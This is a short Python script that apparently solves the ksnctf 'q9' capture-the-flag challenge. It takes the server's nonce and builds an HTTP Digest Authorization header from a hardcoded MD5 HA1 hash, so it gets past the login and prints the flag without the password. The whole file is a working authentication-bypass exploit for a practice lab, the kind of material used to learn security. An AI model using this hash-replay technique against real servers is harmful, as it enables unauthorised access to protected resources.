#!/usr/bin/python
# -*- Coding: utf-8 -*-

import requests
import hashlib
from bs4 import BeautifulSoup as bs

url = "http://ksnctf.sweetduet.info:10080/~q9/flag.html"

#ハッシュ値の逆変換サイトを用いて変換

md5a1 = "c627e19450db746b739f41b64097d449"
nonce = ""
nc = "00000001"
cnonce = "5f70c9b7a0f15b7d"
qop = "auth"
a2 = "GET:/~q9/flag.html"
md5a2 = "ffffdd8b8029499600f95a69beb239c2"

uri = "/~q9/flag.html"

def get_md5(arg):
    return hashlib.md5(arg.encode('utf-8')).hexdigest()

def main():
    auth_header = requests.get(url).headers["WWW-Authenticate"]
    print("[*]Authentication header")
    print(auth_header)

    nonce = auth_header.split(" ")[2][7:-2]
    print(nonce)
    
    response = get_md5(md5a1 + ":" + nonce + ":" + nc + ":" + cnonce + ":" + qop + ":" + md5a2)
    header_2 = "Digest username=\"q9\" ,realm=\"secret\",nonce=\"" + nonce + "\", uri=\"" + uri + "\", algorithm=MD5, response=\"" + response + "\", qop=auth, nc=00000001, cnonce=\"" + cnonce + "\""
    
    new_headers = {"Authorization": header_2}

    answer = requests.get(url, headers=new_headers)

    answer_soup = bs(answer.text, "html.parser")

    print("[*]Flag is ...")
    print(answer_soup.p.text)
        

if __name__ == "__main__":
    main()
